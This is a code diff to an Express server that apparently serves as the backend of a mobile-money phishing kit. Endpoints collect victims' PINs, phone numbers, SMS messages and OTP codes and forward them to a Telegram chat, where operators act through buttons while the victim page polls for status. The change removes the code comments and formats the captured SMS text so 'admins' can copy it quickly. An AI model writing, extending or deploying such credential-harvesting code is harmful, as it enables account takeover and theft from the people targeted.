@@ -6,13 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// In-memory application session store
 const applications = {};
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Create Application Session
 app.post('/api/applications', (req, res) => {
   const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
   applications[appId] = {
@@ -23,7 +21,6 @@ app.post('/api/applications', (req, res) => {
   res.json({ id: appId });
 });
 
-// Verify PIN / Login Endpoint
 app.post('/verify-pin', async (req, res) => {
   const { appId, pin, phone } = req.body;
   if (!applications[appId]) {
@@ -58,16 +55,16 @@ app.post('/verify-pin', async (req, res) => {
   }
 });
 
-// Verify SMS Endpoint
 app.post('/verify-sms', async (req, res) => {
   const { appId, smsText } = req.body;
   if (applications[appId]) {
     applications[appId].sms_text = smsText;
   }
 
+  // Wrapped inside a Markdown code block (``) so admins can copy it directly on Telegram
   const message = `💬 *SMS Verification Text Received*\n\n` +
     `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
-    `📄 *Content:*\n${smsText}\n\n` +
+    `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
@@ -91,7 +88,6 @@ app.post('/verify-sms', async (req, res) => {
   }
 });
 
-// Verify OTP Endpoint
 app.post('/verify-otp', async (req, res) => {
   const { appId, otpCode } = req.body;
   if (applications[appId]) {
@@ -124,14 +120,12 @@ app.post('/verify-otp', async (req, res) => {
   }
 });
 
-// Check Status Endpoint for Polling
 app.get('/check-status/:id', (req, res) => {
   const appData = applications[req.params.id];
   if (!appData) return res.status(404).json({ error: 'Not found' });
   res.json(appData);
 });
 
-// Telegram Webhook Handler
 app.post('/telegram-webhook', async (req, res) => {
   const update = req.body;
   if (update.callback_query) {
@@ -171,4 +165,4 @@ app.post('/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-         
+    
